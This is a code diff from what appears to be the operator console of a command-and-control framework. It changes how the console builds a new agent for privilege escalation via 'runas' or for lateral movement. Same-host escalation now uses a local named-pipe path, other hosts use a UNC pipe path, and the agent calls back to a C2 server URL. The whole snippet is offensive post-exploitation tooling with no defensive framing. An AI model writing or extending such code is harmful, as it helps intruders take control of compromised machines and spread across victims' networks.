@@ -4195,9 +4195,15 @@ async function runCtxAction(act) {
             openConsoleFor(aid);
 
             if (transport === 'smb') {
-              // SMB named pipe: start pipe server on parent + build agent with pipe UNC
+              // SMB named pipe: start pipe server on parent + build agent with pipe path.
+              // For runas (same host), use \\.\pipe\NAME (local device path) so the child
+              // agent connects directly without needing an SMB network session to itself.
+              // For lateral movement (different host), use \\HOST\pipe\NAME (UNC path).
               const pipeName = `priv_${suffix}`;
-              const pipeUNC  = `\\\\${host}\\pipe\\${pipeName}`;
+              const isLocalPrivesc = (vals.method === 'runas');
+              const pipeUNC  = isLocalPrivesc
+                ? `\\\\.\\pipe\\${pipeName}`
+                : `\\\\${host}\\pipe\\${pipeName}`;
               const srvURL   = `http://${c2host}:8080`;
               addConsoleOutputForAgent(aid, `[privesc] Starting pipe server ${pipeName} on parent…`, '', null);
               addConsoleOutputForAgent(aid, `[privesc] Building ${outName} → pipe:${pipeUNC}`, '', null);
